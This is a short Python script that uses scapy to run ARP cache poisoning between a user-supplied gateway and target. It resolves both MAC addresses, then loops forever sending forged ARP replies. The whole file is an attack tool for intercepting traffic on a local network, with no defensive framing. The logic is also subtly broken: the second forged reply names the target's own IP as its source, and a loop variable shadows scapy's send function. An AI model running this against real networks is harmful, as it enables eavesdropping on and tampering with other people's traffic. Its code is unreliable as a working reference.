import time

from scapy.all import *


def arp_pois(gate_ip, gate_mac, target_ip,target_mac):
    while True:
        send(ARP(op=2, pdst=gate_ip, hwdst=gate_mac,psrc=target_ip))
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=target_ip))
        time.sleep(2)

def get_mac(ip):
    resp, unresp = sr(ARP(op=1, hwdst='ff:ff:ff:ff:ff:ff', pdst=ip), retry=2, timeout=10)
    for send, receive in resp:
        return receive[ARP].hwsrc
    return None


gw = input('Gateway IP: ')
target = input('Target IP: ')
gw_mac = get_mac(gw)
target_mac = get_mac(target)
arp_pois(gw, gw_mac, target, target_mac)
